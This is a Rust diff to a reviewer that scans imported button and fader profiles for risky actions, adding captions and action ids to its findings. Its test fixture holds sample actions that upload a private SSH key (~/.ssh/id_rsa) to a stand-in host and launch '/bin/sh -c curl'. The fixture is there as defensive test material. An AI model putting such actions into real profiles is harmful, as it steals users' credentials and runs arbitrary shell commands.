@@ -50,8 +50,12 @@ pub struct Finding {
     pub page: String,
     pub x: u8,
     pub y: u8,
+    /// The button's caption (or the fader's name), so the user can find it.
+    pub caption: String,
     /// The action's `type`
     pub action: String,
+    /// The action's id inside the imported pages, to show it in full.
+    pub action_id: String,
     pub detail: String,
 }
 
@@ -60,16 +64,20 @@ pub fn review(pages: &[Page]) -> Vec<Finding> {
     let mut out = Vec::new();
     for page in pages {
         for b in &page.buttons {
+            let caption = match &b.button.look {
+                super::model::Look::Text { caption, .. } => caption.as_str(),
+                _ => "",
+            };
             for list in [&b.button.down, &b.button.up, &b.button.hold] {
                 for action in list {
-                    inspect(&page.name, b.x, b.y, action, &mut out);
+                    inspect(&page.name, b.x, b.y, caption, action, &mut out);
                 }
             }
         }
         for f in &page.faders {
             for list in [&f.on_change, &f.on_touch, &f.on_release] {
                 for action in list {
-                    inspect(&page.name, f.x, f.y, action, &mut out);
+                    inspect(&page.name, f.x, f.y, &f.name, action, &mut out);
                 }
             }
         }
@@ -78,10 +86,12 @@ pub fn review(pages: &[Page]) -> Vec<Finding> {
     out
 }
 
-fn inspect(page: &str, x: u8, y: u8, action: &Action, out: &mut Vec<Finding>) {
+fn inspect(page: &str, x: u8, y: u8, caption: &str, action: &Action, out: &mut Vec<Finding>) {
     let json = serde_json::to_value(&action.kind).unwrap_or_default();
     let type_name = json.get("type").and_then(|t| t.as_str()).unwrap_or_default().to_string();
-    let mut add = |level: Level, kind: Kind, detail: String| out.push(Finding { level, kind, page: page.to_string(), x, y, action: type_name.clone(), detail });
+    let mut add = |level: Level, kind: Kind, detail: String| {
+        out.push(Finding { level, kind, page: page.to_string(), x, y, caption: caption.to_string(), action: type_name.clone(), action_id: action.id.clone(), detail })
+    };
 
     let mut secrets = Vec::new();
     secrets_in(&json, &mut secrets);
@@ -197,6 +207,7 @@ mod tests {
     #[test]
     fn lists_secrets_uploads_programs_and_scripts() {
         let button = Button {
+            look: crate::profile::model::Look::Text { caption: "Go".into(), size: 16, face: "sans".into(), color: "#ffffff".into() },
             down: vec![
                 action(r#"{"id":"h","type":"httpRequest","method":"post","url":"https://example.com/upload?key={{secret.apiKey}}","bodyMode":"multipart","files":[{"field":"file","path":"/Users/me/.ssh/id_rsa"}],"auth":{"type":"bearer","token":"literal-token"},"ignoreTlsErrors":true}"#),
                 action(r#"{"id":"l","type":"launchApplication","executable":"/bin/sh","arguments":"-c curl"}"#),
@@ -222,7 +233,8 @@ mod tests {
         }
         let secrets: Vec<&str> = findings.iter().filter(|f| f.kind == Kind::Secret).map(|f| f.detail.as_str()).collect();
         assert_eq!(secrets, vec!["apiKey", "other", "apiKey"]);
-        assert!(findings.iter().all(|f| f.page == "Imported" && f.x == 1 && f.y == 2));
+        assert!(findings.iter().all(|f| f.page == "Imported" && f.x == 1 && f.y == 2 && f.caption == "Go" && !f.action_id.is_empty()));
+        assert!(findings.iter().any(|f| f.action_id == "h" && f.kind == Kind::Upload));
         assert_eq!(findings.first().map(|f| f.level), Some(Level::Danger), "most serious first");
         assert_eq!(findings.last().map(|f| f.level), Some(Level::Warning));
         let upload = findings.iter().find(|f| f.kind == Kind::Upload).unwrap();
